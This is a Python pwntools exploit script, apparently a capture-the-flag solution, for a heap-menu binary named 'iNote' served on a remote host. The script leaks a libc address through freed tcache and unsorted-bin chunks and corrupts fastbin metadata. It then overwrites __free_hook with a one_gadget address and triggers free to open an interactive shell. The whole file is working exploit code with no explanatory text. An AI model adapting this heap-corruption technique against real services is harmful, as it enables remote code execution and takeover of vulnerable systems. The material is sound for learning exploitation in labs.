#encoding:utf-8
from pwn import *
context.log_level='debug'
context.terminal=['tmux','sp','-h']

# p=process('./iNote',env={'LD_PRELOAD':'./libc-2.27.so'})
# p = process("./iNote")
p = remote("172.35.15.62",9999)
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

def add(id,size):
    p.sendlineafter("choice: ",str(1))
    p.sendlineafter("Index: ",str(id))
    p.sendlineafter("Size: ",str(size))
def edit(id,content):
    p.sendlineafter("choice: ",str(2))
    p.sendlineafter("Index: ",str(id))
    p.sendafter("Content: ",content)
def show(id):
    p.sendlineafter("choice: ",str(3))
    p.sendlineafter("Index: ",str(id))
def delete(id):
    p.sendlineafter("choice: ",str(4))
    p.sendlineafter("Index: ",str(id))


for i in range(8):
    add(i,0x78)
add(8,0x58)
add(9,0x20)
for i in list(range(8)):
    delete(i)

# for i in range(7):
#     add(i,0x68)
# for i in list(range(7))[::-1]:
#     delete(i)
# delete(8)

p.sendlineafter("choice: ",'1'*0x7000)
for i in list(range(7))[::-1]:
    add(i,0x78)
add(7,0x78)
show(7)
p.recvuntil("Content: ")
main_arean_208 = u64(p.recv(6).ljust(8,'\x00'))
log.info("main_arean_208:"+hex(main_arean_208))
libc_base = main_arean_208 - 208 - (0x7ffff7dcdc40-0x7ffff79e2000)
log.info("libc_base:"+hex(libc_base))

for i in list(range(7)):
    delete(i)
delete(7)
for i in range(7):
    add(i,0x58)
for i in list(range(7)):
    delete(i)
delete(8)
for i in list(range(7)):
    add(i,0x20)
for i in list(range(7)):
    delete(i)
edit(9,(p64(0x100)+p64(0x10))*2)
delete(9)
p.sendlineafter("choice: ",'1'*0x7000)

add(11,0x78)#head
for i in range(6):
    add(i,0x58)
add(12,0x58)#tail
for i in range(6):
    delete(i)
edit(11,'a'*0x78)

for i in range(6):
    add(i,0x78)
add(8,0x78)
for i in range(6):
    delete(i)
for i in range(6):
    add(i,0x58)
add(9,0x58)
for i in range(6):
    delete(i)
add(10,0x10)

for i in range(7):
    add(i,0x78)
for i in range(7):
    delete(i)
delete(8)#fastbin
for i in range(7):
    add(i,0x58)
for i in range(7):
    delete(i)
delete(9)#fastbin
p.sendlineafter("choice: ",'1'*0x7000)

delete(12)
p.sendlineafter("choice: ",'1'*0x7000)

for i in range(7):
    add(i,0x78)
add(8,0x78)
for i in range(7):
    delete(i)
for i in range(7):
    add(i,0x58)
add(9,0x58)
for i in range(7):
    delete(i)
for i in range(7):
    add(i,0x20)
add(12,0x20)#hacker
for i in range(7):
    delete(i)

for i in range(7):
    add(i,0x20)
delete(10)
edit(12,p64(libc_base+libc.sym['__free_hook'])+'\n')
add(14,0x20)
add(15,0x20)
edit(15,p64(libc_base+0x4f432)+'\n')



# for i in range(7):
#     add(i,0x78)
# add(7,0x78)
# for i in range(7):
#     delete(i)

# for i in range(7):
#     add(i,0x58)
# add(8,0x58)
# for i in range(7):
#     delete(i)

# add(6,0x78)
# edit(6,'a'*0x78)
# for i in list(range(7))[::-1]:
#     add(i,0x78)
# edit(7,'a'*0x78)
# edit(7,'a'*0x70+'\x80\x00\x00\x00\x00\x00\x00\x00')
# p.sendlineafter("choice: ",'1'*0x7000)






# gdb.attach(p,"b *0x555555554bf7")
# raw_input()

delete(0)

p.interactive()